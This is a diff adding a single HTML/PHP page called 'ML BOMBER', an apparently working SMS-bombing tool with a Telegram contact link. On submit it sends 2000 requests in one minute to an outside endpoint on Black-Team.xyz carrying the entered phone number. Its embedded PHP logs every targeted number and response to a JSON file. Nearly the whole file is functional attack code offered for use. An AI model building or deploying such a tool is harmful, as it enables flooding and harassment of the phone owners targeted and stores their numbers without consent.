@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Sender</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nosifer&display=swap');
+
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Nosifer', cursive;
+            text-align: center;
+            padding: 50px 0;
+            margin: 0;
+            overflow: hidden;
+            animation: textColorChange 10s infinite;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            border: 2px solid #ff0000;
+            padding: 30px;
+            background: url('your-gif-url.gif') no-repeat center center / cover; /* Replace with your GIF URL */
+            box-shadow: 0 0 15px #ff0000;
+            position: relative;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 3em;
+            color: #ff0000;
+            text-shadow: 2px 2px 10px #ff0000;
+            margin-bottom: 20px;
+            animation: textColorChange 10s infinite;
+        }
+
+        .warning-text {
+            font-size: 2em;
+            color: red; /* Changed to red */
+            margin-bottom: 20px;
+            white-space: nowrap;
+            overflow: hidden;
+            border-right: 3px solid red; /* Cursor effect */
+            animation: typing 4s steps(12, end) infinite alternate;
+            position: absolute;
+            top: 10px; /* Positioning at the top */
+            left: 50%;
+            transform: translateX(-50%); /* Centering horizontally */
+        }
+
+        input, button {
+            padding: 15px;
+            font-size: 1.2em;
+            margin: 10px 0;
+            border: 1px solid #ff0000;
+            background: #333;
+            color: #ff0000;
+            width: 90%;
+            border-radius: 8px;
+        }
+
+        button {
+            cursor: pointer;
+            background-color: #333;
+        }
+
+        button:hover {
+            background-color: #444;
+        }
+
+        @keyframes textColorChange {
+            0% { color: black; }
+            12.5% { color: red; }
+            25% { color: green; }
+            37.5% { color: blue; }
+            50% { color: purple; }
+            62.5% { color: goldenrod; }
+            75% { color: lightgreen; }
+            87.5% { color: yellow; }
+            100% { color: #ff0000; }
+        }
+
+        @keyframes typing {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+
+        /* Loading overlay */
+        #loadingOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: #ff0000;
+            font-size: 1.5em;
+        }
+
+        .progress-circle {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: conic-gradient(#ff0000 0% 0%, #444 0% 100%);
+            animation: progress 1s linear forwards;
+        }
+
+        .progress-circle span {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2em;
+            color: yellow;
+        }
+
+        /* FAB styles */
+        .fab {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background-color: #ff0000;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            text-decoration: none;
+            font-size: 24px;
+            transition: background-color 0.3s;
+        }
+
+        .fab:hover {
+            background-color: #e60000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-text">WARNING ‼️</div>
+        <h1>ML BOMBER</h1>
+        <form id="smsForm">
+            <input type="text" id="phone" name="phone" placeholder="Enter Phone Number" required>
+            <button type="submit">Start</button>
+        </form>
+    </div>
+
+    <!-- Loading overlay -->
+    <div id="loadingOverlay">
+        <div class="progress-circle" id="progressCircle">
+            <span id="progressText">0%</span>
+        </div>
+        <p>Sending requests... please wait.</p>
+    </div>
+
+    <a href="https://t.me/@mlikbalofficial71" class="fab" target="_blank">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" style="width: 30px; height: 30px;">
+    </a>
+
+    <script>
+        const totalRequests = 2000; // Total requests to send
+        const duration = 60; // 1 minute in seconds
+        const intervalTime = (duration * 1000) / totalRequests; // Calculate interval in ms per request
+
+        let requestsSent = 0;
+
+        document.getElementById("smsForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const phone = document.getElementById("phone").value;
+
+            // Show loading overlay
+            document.getElementById("loadingOverlay").style.display = "flex";
+            updateProgress(0);
+
+            const intervalId = setInterval(() => {
+                if (requestsSent >= totalRequests) {
+                    clearInterval(intervalId);
+                    console.log("Finished sending requests.");
+                    // Hide loading overlay when complete
+                    document.getElementById("loadingOverlay").style.display = "none";
+                    return;
+                }
+
+                fetch(`http://Black-Team.xyz/sms/danger.php?phone=${phone}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        saveResponse(phone, data);
+                    })
+                    .catch(error => console.error("Error:", error));
+
+                requestsSent++;
+                updateProgress((requestsSent / totalRequests) * 100);
+            }, intervalTime);
+        });
+
+        function updateProgress(percentage) {
+            const progressText = document.getElementById("progressText");
+            const progressCircle = document.getElementById("progressCircle");
+            progressText.textContent = `${Math.round(percentage)}%`;
+            progressCircle.style.background = `conic-gradient(#ff0000 ${percentage}%, #444 ${percentage}% 100%)`;
+        }
+
+        function saveResponse(phone, response) {
+            fetch("sms_sender.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, response })
+            })
+            .then(res => res.json())
+            .then(data => console.log("Response saved:", data))
+            .catch(error => console.error("Error saving response:", error));
+        }
+    </script>
+
+    <?php
+    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+        $inputData = json_decode(file_get_contents("php://input"), true);
+        $phone = $inputData['phone'];
+        $response = $inputData['response'];
+
+        $dataFile = 'bomb.json';
+        $data = file_exists($dataFile) ? json_decode(file_get_contents($dataFile), true) : [];
+
+        $data[] = [
+            'phone' => $phone,
+            'response' => $response,
+            'timestamp' => date("Y-m-d H:i:s")
+        ];
+
+        file_put_contents($dataFile, json_encode($data));
+
+        echo json_encode(["status" => "success", "message" => "Response saved."]);
+    } else {
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            header('Content-Type: application/json');
+            echo json_encode(["status" => "error", "message" => "Method Not Allowed"]);
+        }
+    }
+    ?>
+</body>
+</html>
